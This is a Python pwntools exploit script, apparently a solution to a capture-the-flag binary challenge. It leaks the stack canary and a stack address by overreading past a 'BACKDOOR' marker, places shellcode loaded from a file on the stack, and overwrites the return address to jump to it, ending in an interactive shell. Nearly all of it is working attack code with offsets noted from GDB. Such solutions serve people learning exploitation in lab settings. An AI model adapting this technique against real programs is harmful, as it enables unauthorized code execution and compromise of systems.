from pwn import *

# the canary is this far away from our buffer
# p/d 0x7fffffffdbb8-0x7fffffffdb90
buf_size_canary = 40
buf_size_ret = 56   # the ret is 16 bytes further

# The stack address we leaked minus the address we want to load our shellcode
# p/d 0x7fffffffdc50-0x7fffffffdbc0
stack_diff = 144

# main = 0x00005555555552fe

# setting the context
context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
context.arch = "amd64"
binary = './challenge'
context.binary = binary

shellcode_file = "./code_raw"

# creating the process
elf = ELF(binary)
p = elf.process()

# run with argument GDB to run in debug mode
if args.GDB:
    p = gdb.debug(binary,aslr=False,gdbscript='''
    b *$BASE+0x127a
    b *$BASE+0x12ab
    c
    x/32a $rsp
    ''')

# We want to leak the canary + an address in the stack.
# The canary is the 7 bytes following "BACKDOOR"
# The stack address is the next 8 bytes
buf_size = buf_size_canary+1
needle = "BACKDOOR"   #6
payload = b'\x90'*(buf_size-len(needle))+needle.encode()

#sending the payload first time to get the canary
p.sendlineafter(b'Insert input size:',str(buf_size).encode())
p.send(payload)
p.recvuntil(b'\x90BACKDOOR')
response = p.recvline()
print(response)
canary_raw = response[:7]
canary = int.from_bytes(b'\x00'+canary_raw,byteorder='little')
print(f"the canary is: {hex(canary)}")
canary = p64(canary)

# now for the stack address
stack_addr_raw = response[7:][:-1]  # remove the new line
stack_addr = int.from_bytes(stack_addr_raw,byteorder='little')
print(f"The leaked stack address is: {hex(stack_addr)}")

shellcode_addr = stack_addr - stack_diff
print(f"The stack address that will have our shellcode is: {hex(shellcode_addr)}")
shellcode_addr = p64(shellcode_addr)

# We want to send the shellcode with the backdoor word so we can also reneter the function
with open(shellcode_file,"rb") as f:
    shellcode = f.read()
buf_size = len(shellcode)+len(needle)
payload = shellcode + needle.encode()
p.sendlineafter(b'Insert input size:',str(buf_size).encode())
p.send(payload)


# Now its time to overwrite the return address with the address where our shellcode is
off = 8+8+8    # +8 for the canary, +8 for the padding and +8 for the ret
buf_size = buf_size_ret + 8
payload = b'A'*(buf_size-off)+ canary + b'C'*8 + shellcode_addr

#sending the payload
p.sendlineafter(b'Insert input size:',str(buf_size).encode())
p.send(payload)

p.interactive()
